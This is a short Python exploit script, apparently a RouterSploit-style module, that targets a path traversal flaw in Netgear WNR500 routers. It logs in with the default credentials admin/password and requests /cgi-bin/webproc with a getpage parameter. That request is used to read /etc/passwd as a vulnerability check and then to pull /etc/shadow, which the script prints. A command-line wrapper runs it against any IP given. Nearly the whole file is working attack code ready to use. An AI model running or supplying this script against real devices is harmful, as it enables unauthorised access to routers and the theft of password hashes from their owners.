target = ""
# rsf exploit module
# title: Netgear WNR500 Path Traversal
# description: Exploits path traversal in Netgear WNR500 devices.
# author: ediop3

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.username = "admin"
        self.password = "password"
        self.filename = "/etc/shadow"
        self.session = requests.Session()

    def run(self):
        if self.check():
            path = f"/cgi-bin/webproc?getpage={self.filename}&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=BAS_bpa"

            try:
                response = self.session.get(
                    f"http://{self.target}:{self.port}{path}",
                    auth=(self.username, self.password),
                    timeout=5
                )
                if response.status_code == 200 and response.text:
                    print(f"[+] Success! File: {self.filename}")
                    print(response.text)
                else:
                    print("[-] Exploit failed")
            except:
                print("[-] Exploit failed")
        else:
            print("[-] Device seems to be not vulnerable")

    def check(self):
        path = "/cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us&var:language=en_us&var:page=BAS_bpa"

        try:
            response = self.session.get(
                f"http://{self.target}:{self.port}{path}",
                auth=(self.username, self.password),
                timeout=5
            )
            if response is None:
                return False

            return "root:" in response.text
        except:
            return False



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
